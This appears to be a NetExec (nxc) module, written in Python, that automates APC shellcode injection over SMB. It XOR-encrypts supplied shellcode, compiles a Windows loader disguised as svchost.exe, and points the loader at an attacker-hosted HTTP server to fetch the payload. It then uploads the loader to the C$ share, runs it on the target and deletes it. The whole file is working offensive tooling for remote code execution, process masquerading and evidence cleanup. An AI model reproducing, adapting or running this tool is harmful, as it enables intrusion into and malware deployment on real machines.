#!/usr/bin/env python3

import os
import subprocess


class NXCModule:

    name = 'apc-inj'
    description = "APC Injection/Encrypt shellcode/Compile Loader/Upload to target/Executing on target/ Cleanup"
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

   
    def options(self, context, module_options):

        self.key = module_options.get("KEY")
        self.shellcode = module_options.get("SHELLCODE")
        self.stager = module_options.get("STAGER")

        self.base_path = os.path.dirname(__file__)


    def on_login(self, context, connection):

        context.log.highlight("[*] APC Inject module triggered on login")

        try:
            self.run_xor(context, connection)
        except Exception as e:
            context.log.error(f"XOR failed: {e}")

        try:
            self.make_loader(context, connection)
        except Exception as e:
            context.log.error(f"Loader failed: {e}")
        try:
            self.http_server(context, connection)
        except Exception as e:
            context.log.error(f"HTTP SERVER failed: {e}")

        try:
            self.file_upload(context, connection)
        except Exception as e:
            context.log.error(f"Upload failed: {e}")

        try:
            self.executing_command(context, connection)
        except Exception as e:
            context.log.error(f"Exec failed: {e}")
        try:
            self.executing_cleanup(context, connection)
        except Exception as e:
            context.log.error(f"Cleanup failed: {e}")


    def run_xor(self, context, connection):

        if not self.key or not self.shellcode:
            context.log.error("KEY or SHELLCODE missing")
            return

        script_path = os.path.join(self.base_path, "encrypt", "xor.py")

        cmd = ["python3", script_path, self.key, self.shellcode]
        res = subprocess.run(cmd, capture_output=True, text=True)

        context.log.highlight(f"[*] Shellcode is encrypted using key: {self.key}")
        context.log.highlight("[*] Encrypted shellcode saved to encrypted_shellcode.bin")
    def make_loader(self, context, connection):

        if not self.stager or not self.key:
            context.log.error("STAGER or KEY missing")
            return

        source = os.path.join(self.base_path, "apcinjection", "main.c")

        cmd = [
            "x86_64-w64-mingw32-gcc",
            source,
            "-o", "svchost.exe",
            f'-DPAYLOAD=L"http://{self.stager}:8000/encrypted_shellcode.bin"',
            f"-DAPI_KEY=\"{self.key}\"",
            "-lwininet"
        ]

        subprocess.run(cmd, check=True)
        context.log.highlight("[*] Loader compiled")
    def http_server(self, context, connection):

        import subprocess

        cmd = ["timeout", "15s", "python3", "-m", "http.server"]

        subprocess.Popen(cmd, cwd=os.getcwd())

        context.log.highlight("[*] HTTP server started")


    def file_upload(self, context, connection):

        share = "C$"

        local_file = os.path.join(os.getcwd(), "svchost.exe")
        remote_file = "Windows/System/svchost.exe"

        try:
            with open(local_file, "rb") as f:
                connection.conn.putFile(share, remote_file, f.read)

            context.log.highlight("[*] File uploaded")

        except Exception as e:
            context.log.error(f"Upload failed: {e}")


    def executing_command(self, context, connection):

        command = "C:\\Windows\\System\\svchost.exe"
        connection.execute("C:\\Windows\\System\\svchost.exe")

        context.log.highlight(f"[*] Executed: {command}")
    def executing_cleanup(self, context, connection):
        import time

        time.sleep(2)
       
        command = r'cmd.exe /c "del /f /q C:\\Windows\\System\\svchost.exe"'
        
        connection.execute(command)

        context.log.highlight(f"[*] Executed: {command}")        
